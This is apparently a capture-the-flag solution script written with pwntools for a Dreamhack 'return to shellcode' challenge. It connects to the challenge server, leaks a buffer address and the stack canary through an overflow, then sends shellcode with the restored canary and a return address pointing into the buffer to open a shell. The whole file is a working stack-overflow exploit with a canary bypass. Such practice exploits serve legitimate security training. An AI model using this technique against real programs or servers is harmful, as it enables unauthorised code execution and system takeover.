from pwn import *

def slog(n, m):
    return success(": ".join([n, hex(m)]))


p = remote('host3.dreamhack.games', 12802)
# p = process('./r2s')

context.arch = "amd64"

p.recvuntil('buf: ')
buf_addr = int(p.recvline()[:-1], 16)
slog("Addr of buf", buf_addr)

p.recvuntil('$rbp:')
buf_rbp = int(p.recvline().split()[0])
buf_cnry = buf_rbp - 8
slog('buf to rbp', buf_rbp)
slog('buf to canary', buf_cnry)

payload = b'A' * (buf_cnry + 1)
p.sendafter('Input:', payload)

p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))
slog('Canary', canary)

sh = asm(shellcraft.sh())

payload = sh.ljust(buf_cnry, b'A') + p64(canary) + b'B' * 0x08 + p64(buf_addr)

p.sendlineafter('Input: ', payload)

p.interactive()